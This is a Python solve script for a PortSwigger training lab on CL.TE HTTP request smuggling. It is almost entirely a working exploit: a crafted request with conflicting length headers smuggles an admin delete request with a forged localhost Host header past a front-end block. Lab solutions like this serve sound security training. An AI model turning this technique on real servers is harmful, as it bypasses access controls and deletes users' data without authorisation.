#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to bypass front-end security controls (CL.TE).

Front-end blocks /admin; back-end allows it with Host: localhost. We smuggle
a GET /admin/delete?username=carlos with Host: localhost through a CL.TE
desync. The front-end never inspects the smuggled bytes; the back-end
processes them with the forged Host.

Raw TLS sockets because `requests` normalizes the conflicting length headers.
"""

import argparse
import socket
import ssl
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 139\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /admin/delete?username=carlos HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 10\r\n"
    "\r\n"
    "x="
)


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 6 (CL.TE front-end bypass)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE_TEMPLATE.format(host=host).encode()
    smuggled_body = (
        "0\r\n\r\nGET /admin/delete?username=carlos HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 10\r\n\r\nx="
    )
    assert len(smuggled_body.encode()) == 139, (
        f"Smuggled body must be exactly 139 bytes; got {len(smuggled_body.encode())}"
    )

    print(f"[*] Sending smuggle twice to {host}:{port} (deleting carlos)")
    responses = send_sequence(host, port, body)

    for i, r in enumerate(responses, 1):
        status = r.split(b"\r\n", 1)[0].decode(errors="replace") if r else "<empty>"
        print(f"\n[+] Response {i} status: {status}")

    print("\n[*] Check the lab page — carlos should be deleted and the lab marked solved.")


if __name__ == "__main__":
    main()
